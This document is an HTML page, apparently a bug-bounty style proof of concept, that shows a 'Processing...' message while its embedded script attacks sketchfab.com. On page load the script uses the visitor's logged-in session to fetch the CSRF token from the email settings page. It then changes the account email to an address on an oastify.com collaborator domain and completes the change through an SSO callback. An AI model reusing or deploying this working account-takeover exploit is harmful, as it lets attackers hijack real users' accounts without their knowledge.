<!DOCTYPE html>
<html>
<head>
    <title>Processing...</title>
</head>
<body>
    <h1>Please wait, processing your request...</h1>
    <p id="status">Initializing...</p>

    <script>
        // تابع کمکی برای تأخیر
        const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

        // تابع استخراج csrf token از صفحه HTML
        function extractCsrfToken(htmlText) {
            // جستجوی input مخفی با name="csrfmiddlewaretoken"
            const regex = /<input[^>]*name=["']csrfmiddlewaretoken["'][^>]*value=["']([^"']+)["']/i;
            const match = htmlText.match(regex);
            if (match && match[1]) {
                return match[1];
            }
            // روش جایگزین: جستجو در محتوای صفحه
            const altRegex = /csrfmiddlewaretoken\s*:\s*["']([^"']+)["']/i;
            const altMatch = htmlText.match(altRegex);
            if (altMatch && altMatch[1]) return altMatch[1];
            return null;
        }

        async function fetchCsrfTokenFromPage() {
            const url = 'https://sketchfab.com/settings/email/';
            const response = await fetch(url, {
                method: 'GET',
                credentials: 'include',   // ارسال کوکی session
                headers: {
                    'Accept': 'text/html,application/xhtml+xml'
                }
            });
            if (!response.ok) {
                throw new Error(`Failed to load page: ${response.status}`);
            }
            const html = await response.text();
            const token = extractCsrfToken(html);
            if (!token) {
                throw new Error('CSRF token not found in page');
            }
            return token;
        }

        // درخواست اول: تغییر ایمیل
        async function step1_changeEmail(csrfToken) {
            const url = 'https://sketchfab.com/settings/email/sso-verify-callback';
            const emailPayload = JSON.stringify({
                "email": "pouryet3@gmail.com.gzjkg2psu523o7ao6del6o1ib9h050tp.oastify.com"
            });

            const response = await fetch(url, {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Csrftoken': csrfToken
                },
                body: emailPayload
            });

            if (response.ok) {
                const data = await response.json();
                if (data.success === true) return true;
            }
            return false;
        }

        // درخواست دوم: تکمیل تغییر (SSO callback)
        async function step2_confirmEmail(csrfToken) {
            const url = 'https://sketchfab.com/social/login/epic/';
            const params = new URLSearchParams({
                'csrfmiddlewaretoken': csrfToken,
                'next': '/settings/email/sso-verify-callback'
            });

            const response = await fetch(url, {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: params,
                redirect: 'follow'   // دنبال کردن خودکار 302
            });

            // بررسی نهایی (حتی اگر ریدایرکت شده باشد)
            return response.redirected || response.ok;
        }

        // اجرای اصلی
        (async function() {
            try {
                document.getElementById('status').innerText = 'Fetching CSRF token from page...';
                const csrfToken = await fetchCsrfTokenFromPage();
                console.log('[+] CSRF token obtained:', csrfToken);
                document.getElementById('status').innerText = 'CSRF token obtained. Sending email change request...';

                const step1 = await step1_changeEmail(csrfToken);
                if (!step1) throw new Error('Step 1 failed');

                document.getElementById('status').innerText = 'Email change initiated. Waiting 2 seconds...';
                await delay(2000);

                document.getElementById('status').innerText = 'Sending confirmation request...';
                const step2 = await step2_confirmEmail(csrfToken);
                if (!step2) throw new Error('Step 2 failed');

                document.getElementById('status').innerText = 'Exploit completed successfully!';
                document.body.innerHTML = '<h2 style="color:green">Done! The email has been changed.</h2>';
                console.log('[+] Full exploit chain successful');
            } catch (err) {
                console.error('[-] Exploit error:', err);
                document.getElementById('status').innerText = 'Error: ' + err.message;
                document.body.innerHTML += '<p style="color:red">Exploit failed. Check console.</p>';
            }
        })();
    </script>
</body>
</html>
